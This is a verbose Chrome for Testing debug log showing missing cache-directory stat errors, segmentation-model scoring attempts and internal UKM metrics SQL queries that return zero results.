[2209:2212:0601/053751.828653:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_027": No such file or directory (2)
[2209:2212:0601/053751.828669:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_028": No such file or directory (2)
[2209:2212:0601/053751.828700:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_029": No such file or directory (2)
[2209:2212:0601/053751.828719:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_030": No such file or directory (2)
[2209:2212:0601/053751.828736:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_031": No such file or directory (2)
[2209:2212:0601/053751.828752:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_032": No such file or directory (2)
[2209:2212:0601/053751.828769:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_033": No such file or directory (2)
[2209:2212:0601/053751.828786:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_034": No such file or directory (2)
[2209:2212:0601/053751.828803:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_035": No such file or directory (2)
[2209:2212:0601/053751.828820:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_036": No such file or directory (2)
[2209:2212:0601/053751.828837:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_037": No such file or directory (2)
[2209:2212:0601/053751.828854:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_038": No such file or directory (2)
[2209:2212:0601/053751.828871:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_039": No such file or directory (2)
[2209:2212:0601/053751.828888:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_040": No such file or directory (2)
[2209:2212:0601/053751.828904:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_041": No such file or directory (2)
[2209:2212:0601/053751.828924:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_042": No such file or directory (2)
[2209:2212:0601/053751.828951:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_043": No such file or directory (2)
[2209:2212:0601/053751.828975:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_044": No such file or directory (2)
[2209:2212:0601/053751.828993:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_045": No such file or directory (2)
[2209:2212:0601/053751.829010:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_046": No such file or directory (2)
[2209:2212:0601/053751.829031:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_047": No such file or directory (2)
[2209:2212:0601/053751.829048:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_048": No such file or directory (2)
[2209:2212:0601/053751.829065:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_049": No such file or directory (2)
[2209:2212:0601/053751.829082:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_050": No such file or directory (2)
[2209:2212:0601/053751.829099:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_051": No such file or directory (2)
[2209:2212:0601/053751.829118:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_052": No such file or directory (2)
[2209:2212:0601/053751.829135:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_053": No such file or directory (2)
[2209:2212:0601/053751.829154:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_054": No such file or directory (2)
[2209:2212:0601/053751.829173:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_055": No such file or directory (2)
[2209:2212:0601/053751.829190:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_056": No such file or directory (2)
[2209:2212:0601/053751.829209:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_057": No such file or directory (2)
[2209:2212:0601/053751.829232:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_058": No such file or directory (2)
[2209:2212:0601/053751.829258:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_059": No such file or directory (2)
[2209:2212:0601/053751.829275:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_060": No such file or directory (2)
[2209:2212:0601/053751.829503:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_061": No such file or directory (2)
[2209:2212:0601/053751.829530:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_062": No such file or directory (2)
[2209:2212:0601/053751.829548:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_063": No such file or directory (2)
[2209:2212:0601/053751.829565:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_064": No such file or directory (2)
[2209:2212:0601/053751.829582:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_065": No such file or directory (2)
[2209:2212:0601/053751.829599:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_066": No such file or directory (2)
[2209:2212:0601/053751.829616:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_067": No such file or directory (2)
[2209:2212:0601/053751.829633:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_068": No such file or directory (2)
[2209:2212:0601/053751.829650:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_069": No such file or directory (2)
[2209:2212:0601/053751.829667:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_070": No such file or directory (2)
[2209:2212:0601/053751.829696:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_071": No such file or directory (2)
[2209:2212:0601/053751.829714:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_072": No such file or directory (2)
[2209:2212:0601/053751.829737:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_073": No such file or directory (2)
[2209:2212:0601/053751.829766:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_074": No such file or directory (2)
[2209:2212:0601/053751.829796:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_075": No such file or directory (2)
[2209:2212:0601/053751.829814:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_076": No such file or directory (2)
[2209:2212:0601/053751.829831:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_077": No such file or directory (2)
[2209:2212:0601/053751.829849:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_078": No such file or directory (2)
[2209:2212:0601/053751.829866:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_079": No such file or directory (2)
[2209:2212:0601/053751.829882:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_080": No such file or directory (2)
[2209:2212:0601/053751.830087:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_081": No such file or directory (2)
[2209:2212:0601/053751.830116:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_082": No such file or directory (2)
[2209:2212:0601/053751.830133:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_083": No such file or directory (2)
[2209:2212:0601/053751.830151:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_084": No such file or directory (2)
[2209:2212:0601/053751.830170:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_085": No such file or directory (2)
[2209:2212:0601/053751.830187:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_086": No such file or directory (2)
[2209:2212:0601/053751.830206:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_087": No such file or directory (2)
[2209:2212:0601/053751.830227:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_088": No such file or directory (2)
[2209:2212:0601/053751.830245:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_089": No such file or directory (2)
[2209:2212:0601/053751.830262:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_090": No such file or directory (2)
[2209:2212:0601/053751.830280:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_091": No such file or directory (2)
[2209:2212:0601/053751.830297:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_092": No such file or directory (2)
[2209:2212:0601/053751.830315:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_093": No such file or directory (2)
[2209:2212:0601/053751.830336:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_094": No such file or directory (2)
[2209:2212:0601/053751.830362:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_095": No such file or directory (2)
[2209:2212:0601/053751.830379:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_096": No such file or directory (2)
[2209:2212:0601/053751.830399:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_097": No such file or directory (2)
[2209:2212:0601/053751.830416:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_098": No such file or directory (2)
[2209:2212:0601/053751.830433:VERBOSE1:file_util_posix.cc(315)] Cannot stat "/var/www/.cache/google-chrome-for-testing/Default/Cache/old_Cache_Data_099": No such file or directory (2)
[2180:2180:0601/053752.023259:VERBOSE1:segment_result_provider.cc(136)] GetSegmentResult: segment=OPTIMIZATION_TARGET_SEGMENTATION_DEVICE_SWITCHER ignoring DB score, executing model.
[2180:2180:0601/053752.023292:VERBOSE1:segment_result_provider.cc(277)] ExecuteModelAndGetScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_DEVICE_SWITCHER server segment info not available
[2180:2180:0601/053752.023319:VERBOSE1:segment_result_provider.cc(210)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_DEVICE_SWITCHER failed to get database model score, trying default model.
[2180:2180:0601/053756.822733:VERBOSE1:segment_result_provider.cc(226)] GetCachedModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT does not have a segment info.
[2180:2180:0601/053756.822763:VERBOSE1:segment_result_provider.cc(172)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT failed to get score from database, executing server model.
[2180:2180:0601/053756.822777:VERBOSE1:segment_result_provider.cc(277)] ExecuteModelAndGetScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT server segment info not available
[2180:2180:0601/053756.822792:VERBOSE1:segment_result_provider.cc(201)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT failed to get score from executing server model, getting score from default model from db.
[2180:2180:0601/053756.822805:VERBOSE1:segment_result_provider.cc(240)] GetCachedModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT has expired or unavailable result.
[2180:2180:0601/053756.822818:VERBOSE1:segment_result_provider.cc(210)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT failed to get database model score, trying default model.
[2180:2180:0601/053756.823376:VERBOSE1:segment_result_provider.cc(226)] GetCachedModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER does not have a segment info.
[2180:2180:0601/053756.823401:VERBOSE1:segment_result_provider.cc(172)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER failed to get score from database, executing server model.
[2180:2180:0601/053756.823412:VERBOSE1:segment_result_provider.cc(277)] ExecuteModelAndGetScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER server segment info not available
[2180:2180:0601/053756.823422:VERBOSE1:segment_result_provider.cc(201)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER failed to get score from executing server model, getting score from default model from db.
[2180:2180:0601/053756.823432:VERBOSE1:segment_result_provider.cc(240)] GetCachedModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER has expired or unavailable result.
[2180:2180:0601/053756.823439:VERBOSE1:segment_result_provider.cc(210)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SEARCH_USER failed to get database model score, trying default model.
[2180:2180:0601/053756.823487:VERBOSE1:segment_result_provider.cc(226)] GetCachedModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER does not have a segment info.
[2180:2180:0601/053756.823500:VERBOSE1:segment_result_provider.cc(172)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER failed to get score from database, executing server model.
[2180:2180:0601/053756.823512:VERBOSE1:segment_result_provider.cc(277)] ExecuteModelAndGetScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER server segment info not available
[2180:2180:0601/053756.823525:VERBOSE1:segment_result_provider.cc(201)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER failed to get score from executing server model, getting score from default model from db.
[2180:2180:0601/053756.823538:VERBOSE1:segment_result_provider.cc(240)] GetCachedModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER has expired or unavailable result.
[2180:2180:0601/053756.823550:VERBOSE1:segment_result_provider.cc(210)] OnGotModelScore: segment=OPTIMIZATION_TARGET_SEGMENTATION_SHOPPING_USER failed to get database model score, trying default model.
[2180:2180:0601/053756.823603:VERBOSE1:segment_result_provider.cc(226)] GetCachedModelScore: segment=CROSS_DEVICE_USER_SEGMENT does not have a segment info.
[2180:2180:0601/053756.823612:VERBOSE1:segment_result_provider.cc(172)] OnGotModelScore: segment=CROSS_DEVICE_USER_SEGMENT failed to get score from database, executing server model.
[2180:2180:0601/053756.823619:VERBOSE1:segment_result_provider.cc(277)] ExecuteModelAndGetScore: segment=CROSS_DEVICE_USER_SEGMENT server segment info not available
[2180:2180:0601/053756.823627:VERBOSE1:segment_result_provider.cc(201)] OnGotModelScore: segment=CROSS_DEVICE_USER_SEGMENT failed to get score from executing server model, getting score from default model from db.
[2180:2180:0601/053756.823635:VERBOSE1:segment_result_provider.cc(240)] GetCachedModelScore: segment=CROSS_DEVICE_USER_SEGMENT has expired or unavailable result.
[2180:2180:0601/053756.823645:VERBOSE1:segment_result_provider.cc(210)] OnGotModelScore: segment=CROSS_DEVICE_USER_SEGMENT failed to get database model score, trying default model.
[2180:2180:0601/053756.823781:VERBOSE1:segment_result_provider.cc(226)] GetCachedModelScore: segment=RESUME_HEAVY_USER_SEGMENT does not have a segment info.
[2180:2180:0601/053756.823797:VERBOSE1:segment_result_provider.cc(172)] OnGotModelScore: segment=RESUME_HEAVY_USER_SEGMENT failed to get score from database, executing server model.
[2180:2180:0601/053756.823808:VERBOSE1:segment_result_provider.cc(277)] ExecuteModelAndGetScore: segment=RESUME_HEAVY_USER_SEGMENT server segment info not available
[2180:2180:0601/053756.823820:VERBOSE1:segment_result_provider.cc(201)] OnGotModelScore: segment=RESUME_HEAVY_USER_SEGMENT failed to get score from executing server model, getting score from default model from db.
[2180:2180:0601/053756.823833:VERBOSE1:segment_result_provider.cc(240)] GetCachedModelScore: segment=RESUME_HEAVY_USER_SEGMENT has expired or unavailable result.
[2180:2180:0601/053756.823844:VERBOSE1:segment_result_provider.cc(210)] OnGotModelScore: segment=RESUME_HEAVY_USER_SEGMENT failed to get database model score, trying default model.
[2180:2180:0601/053756.823915:VERBOSE1:segment_result_provider.cc(226)] GetCachedModelScore: segment=PASSWORD_MANAGER_USER does not have a segment info.
[2180:2180:0601/053756.823937:VERBOSE1:segment_result_provider.cc(172)] OnGotModelScore: segment=PASSWORD_MANAGER_USER failed to get score from database, executing server model.
[2180:2180:0601/053756.823944:VERBOSE1:segment_result_provider.cc(277)] ExecuteModelAndGetScore: segment=PASSWORD_MANAGER_USER server segment info not available
[2180:2180:0601/053756.823952:VERBOSE1:segment_result_provider.cc(201)] OnGotModelScore: segment=PASSWORD_MANAGER_USER failed to get score from executing server model, getting score from default model from db.
[2180:2180:0601/053756.823974:VERBOSE1:segment_result_provider.cc(240)] GetCachedModelScore: segment=PASSWORD_MANAGER_USER has expired or unavailable result.
[2180:2180:0601/053756.823985:VERBOSE1:segment_result_provider.cc(210)] OnGotModelScore: segment=PASSWORD_MANAGER_USER failed to get database model score, trying default model.
[2180:2193:0601/053756.824212:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query WITH all_buckets(bucket)AS(VALUES(0),(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26),(27))SELECT IFNULL(count_vals,0)FROM (SELECT SUM(metric_value) AS sum_vals, COUNT(metric_value) AS count_vals, (event_timestamp-?)/? AS bucket FROM uma_metrics WHERE metric_hash='4F47AC1641163C54' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? GROUP BY bucket)RIGHT JOIN all_buckets USING(bucket)ORDER BY bucket Bind values: 0:2026-05-04 05:37:56.822832 UTC 1:86400000000 2:2466474089 3:3 4:2026-05-04 05:37:56.822832 UTC 5:2026-06-01 05:37:56.822832 UTC  Result: 0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,0.000000,
[2180:2193:0601/053756.824360:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='603A678A76802F71' AND profile_id=? AND type=? AND metric_value IN(1)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-04 05:37:56.823449 UTC 3:2026-06-01 05:37:56.823449 UTC  Result: 0.000000,
[2180:2180:0601/053756.824442:VERBOSE1:model_executor_impl.cc(189)] Segmentation model input:  feature 0: 0 feature 1: 0 feature 2: 0 feature 3: 0 feature 4: 0 feature 5: 0 feature 6: 0 feature 7: 0 feature 8: 0 feature 9: 0 feature 10: 0 feature 11: 0 feature 12: 0 feature 13: 0 feature 14: 0 feature 15: 0 feature 16: 0 feature 17: 0 feature 18: 0 feature 19: 0 feature 20: 0 feature 21: 0 feature 22: 0 feature 23: 0 feature 24: 0 feature 25: 0 feature 26: 0 feature 27: 0 for segment OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT
[2180:2193:0601/053756.824498:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='1A94D82447638877' AND profile_id=? AND type=? AND metric_value IN(1)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-25 05:37:56.823562 UTC 3:2026-06-01 05:37:56.823562 UTC  Result: 0.000000,
[2180:2180:0601/053756.824507:VERBOSE1:model_executor_impl.cc(218)] Segmentation model result:  output 0: 1 for segment OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT
[2180:2193:0601/053756.824629:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='8A5076C9026398BD' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:1 2:2026-05-25 05:37:56.823562 UTC 3:2026-06-01 05:37:56.823562 UTC  Result: 0.000000,
[2180:2193:0601/053756.824735:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT COALESCE((SELECT metric_value FROM uma_metrics WHERE metric_hash='ED7CFEC70BF9942D' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? ORDER BY event_timestamp DESC,id DESC LIMIT 1),0.000000) Bind values: 0:2466474089 1:3 2:2026-05-25 05:37:56.823562 UTC 3:2026-06-01 05:37:56.823562 UTC  Result: 0.000000,
[2180:2193:0601/053756.824819:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT COALESCE((SELECT metric_value FROM uma_metrics WHERE metric_hash='9AD089D233757CA7' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? ORDER BY event_timestamp DESC,id DESC LIMIT 1),0.000000) Bind values: 0:2466474089 1:3 2:2026-05-04 05:37:56.823657 UTC 3:2026-06-01 05:37:56.823657 UTC  Result: 0.000000,
[2180:2193:0601/053756.824900:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT COALESCE((SELECT metric_value FROM uma_metrics WHERE metric_hash='43AA16B058663FB7' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? ORDER BY event_timestamp DESC,id DESC LIMIT 1),0.000000) Bind values: 0:2466474089 1:3 2:2026-05-04 05:37:56.823657 UTC 3:2026-06-01 05:37:56.823657 UTC  Result: 0.000000,
[2180:2193:0601/053756.824980:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT COALESCE((SELECT metric_value FROM uma_metrics WHERE metric_hash='B00E169A508F10AD' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? ORDER BY event_timestamp DESC,id DESC LIMIT 1),0.000000) Bind values: 0:2466474089 1:3 2:2026-05-04 05:37:56.823657 UTC 3:2026-06-01 05:37:56.823657 UTC  Result: 0.000000,
[2180:2193:0601/053756.825056:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT COALESCE((SELECT metric_value FROM uma_metrics WHERE metric_hash='5FD2B9E0B59FBE33' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? ORDER BY event_timestamp DESC,id DESC LIMIT 1),0.000000) Bind values: 0:2466474089 1:3 2:2026-05-04 05:37:56.823657 UTC 3:2026-06-01 05:37:56.823657 UTC  Result: 0.000000,
[2180:2193:0601/053756.825123:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='C5E37EF42704563E' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:1 2:2026-05-25 05:37:56.823858 UTC 3:2026-06-01 05:37:56.823858 UTC  Result: 0.000000,
[2180:2193:0601/053756.825178:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='B72DBAE88DD1CF7D' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:1 2:2026-05-25 05:37:56.823858 UTC 3:2026-06-01 05:37:56.823858 UTC  Result: 0.000000,
[2180:2193:0601/053756.825224:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='43D86E968F3E094A' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:1 2:2026-05-25 05:37:56.823858 UTC 3:2026-06-01 05:37:56.823858 UTC  Result: 0.000000,
[2180:2193:0601/053756.825281:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='2CA9FE4BEBD6A7C5' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:1 2:2026-05-25 05:37:56.823858 UTC 3:2026-06-01 05:37:56.823858 UTC  Result: 0.000000,
[2180:2193:0601/053756.825331:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='EBCD1644AA07E17B' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:1 2:2026-05-25 05:37:56.823858 UTC 3:2026-06-01 05:37:56.823858 UTC  Result: 0.000000,
[2180:2193:0601/053756.825388:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='74AFBBB14C4DB32A' AND profile_id=? AND type=? AND metric_value IN(0)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-04 05:37:56.823999 UTC 3:2026-06-01 05:37:56.823999 UTC  Result: 0.000000,
[2180:2193:0601/053756.825458:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT COALESCE((SELECT metric_value FROM uma_metrics WHERE metric_hash='6BF86CCA1FD02CBD' AND profile_id=? AND type=? AND event_timestamp BETWEEN ? AND ? ORDER BY event_timestamp DESC,id DESC LIMIT 1),0.000000) Bind values: 0:2466474089 1:3 2:2026-05-04 05:37:56.823999 UTC 3:2026-06-01 05:37:56.823999 UTC  Result: 0.000000,
[2180:2180:0601/053756.824579:VERBOSE1:segment_result_provider.cc(29)] ComputeDiscreteMapping: segment=: result=1, rank=1
[2180:2180:0601/053756.825518:VERBOSE1:segment_result_provider.cc(359)] OnModelExecuted: Default model executed successfully. Result: PredictionResult: timestamp: 13424765876824571 result 0: 1 for segment OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEMENT
[2180:2193:0601/053756.825537:VERBOSE1:ukm_database_backend.cc(328)] Output from SQL query SELECT IFNULL(COUNT(metric_value),0)FROM uma_metrics WHERE metric_hash='F1B94D87A1EF91D5' AND profile_id=? AND type=? AND metric_value IN(0,1,2)AND event_timestamp BETWEEN ? AND ? Bind values: 0:2466474089 1:2 2:2026-05-04 05:37:56.823999 UTC 3:2026-06-01 05:37:56.823999 UTC  Result: 0.000000,
